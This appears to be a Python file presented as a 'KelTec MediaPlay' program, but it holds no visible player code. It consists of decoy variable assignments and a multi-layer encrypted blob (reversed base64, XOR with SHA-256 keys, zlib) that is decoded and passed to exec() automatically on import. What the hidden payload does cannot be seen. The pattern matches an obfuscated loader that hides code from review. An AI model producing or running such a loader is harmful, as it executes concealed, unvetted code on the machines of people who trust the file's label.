# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 602263 ^ 509025
_lx1_1 = len("2c736f")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-372017)
_lx3_3 = 289748 * 0
_lx4_4 = 836993 ^ 391287
_K = '7f7371f0c9522187d354d989de107fd0921eed63bd55d916a797ae56a9f18446'
_M = '8A0RFyUnxDD/Db1fMO8Zda/cYM2bwM5V3+79BjfNvQnxWxgfbG2YdaEMvgg+5hlyp4o1kZXHyFiN7/pUP8/rCaEKHk83YZ928w61'
_D = '=Y/myfqV2vyrpyCwKnezn/fmAamue0usoFQy/m/1Ku88/yXoARR9CdCHyqyCugXumnDuxbvCsgFjihVuqM97EylOxIqznMqIUldslUANZEaDNRjuJ5xav++wR5kX652dCTiIFdF7t2V+nTcpAyqpGd3v/uczLNgcPC2g+6keeV+/HV1XDoPg27POgfWpepzZ525i2ZVj2X5yuJJU7ijc8txRSEhIfmA2VfK3MQzbj6ob/V/X0eCZs8dhszHm1UozC/Xsc7b2+koOeZJ48H/VXzTomurVMYE4IvHkIpz8sgu1DGKhtq/3xZLJMuPfJ7dD0M8nbUOsrDxCl3N0GQZDIrt2CC5QFfrpsymSEUrypXdLMW79h2p2V0NW/YCfZ3fKBsf0jBKlm4fOkiQyi9jI3VwQQJ7aNTiJ/GP/rbm12NCyhgIWdX4boR4/+68Y7mwIxSSEJwA6oDQKY0FGBsieQJpHEq5MehyhzRYJsrV4pIfLVF4pL7Fq9KPn1ncryU0ZOvfEyDUsdQzksg0XI37Tgay5m7C/bt0J44G3Uob0muo1Zi9RiQJIwCGUBdBfGd5kfCB2+N8WvRAA2l+BlmsfrbjZ77GiSdtgGPnbRuhir3a1I3NgjVk66G5fD0/JX+yHQ5Jenkmfjx6h3uIkSgDieqjER+5UcsPcefnSgbacIyWmz67VDG7IC45TTBKIMSb1s5IeefSEFAQop+FxdyCtcJnCNlhsgDkb94rsO+/FaKOmj7cE3BA9KIs8xMLtTUuZVva7SfWhHUWQ5hxOI4IJ1oUFA3ACXkw6e+jW0H7S0e46MB9Q7REIjMK0rOvUd4pO4rW1hfpUw2rTTp+fACDEF/z27VqZTqQofYT+sV1Fq/Hx6LANDXqVTkNquGKS6eFBxd8oxCOhKR7Ens5ghOC0mLFGiLQ+oNa+gmrcP7VOus2m/OM74812RK7OFNMwlkd449KzX7SECIJcPFIAl8ARqfIr9LaSLD2c++hVXErXlSbA080I77T2omglV1PIOlRY7JJ390E3HxjafyOoc4iqWfaaEX2hgKipe10QrT7lMoyRu/E/u0ilUaYvwYY9TGSx+Q3IrkX+Ede2mXXK6SZBQrcCaTO9KERPPg+zCotKVvTW1XO8Nkndev91jndSuUEZLEK4Dl1kBBFLgNkVTXcZxs4kTDAQkC7ZMB/e2PzCpvTPp1B1AgWBPMHP3hdnK9JdM/sxSc2V3gklEMybERAmm3EpLUCaKfATU1iDoRnZH+prXQuk1uhRLWSijOOj68n3B0G+CZijfr8Hc8x1wBz5RUBvDr5ECOwVtVo1tKOKIZQ8u5EGDVO5ZEn94UJg1+ZOUTbjb+aBWuc3kDuKhEltqxdz6I72g9U/QjoW/tnU7Td29YI6CKBXxtVR9gUZ8ocI7F6VaqojS6u6Cjfgj8RZbriAILnjoL2/WTTqWlfoqJnIQl/NyFgqCveK0Fr+/cCzIownKahvmNUWpTd31xKKdnZSQC79B8/mEHJ7Fbt4tqfpzgrbrupDEHaqMHkuYAnZRUFrYpktN8uytmkCIWgM8mfuMYMhSRJ+SnSSrlz5vgLmusfWKI8Stv4nseKCV7SIsBJcIXA7l6V5QdsEUxDKGnJHX1n+d8/dllU1vKlmYjmXofVV0Dx0Zft9RRUz7Thrl57WEJWswY0E1rfGbZqIRsHWxlEAOGyl0HecDWLgrBbKAV5I7fo6qhGUSPnHHvwZSqiFIc6oo8Cz4JbzrF4ffoloOJswY6C4ZPKkVVz+BSDLBQcAS99+Gvj/gphVO7VS+m5922I2ohlugixiT3uiXPNxQhf7LBc7lhdCykCZM7tKmKm7HwkSi2ntj//5SAHQAhBpcfJ8y4wt'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})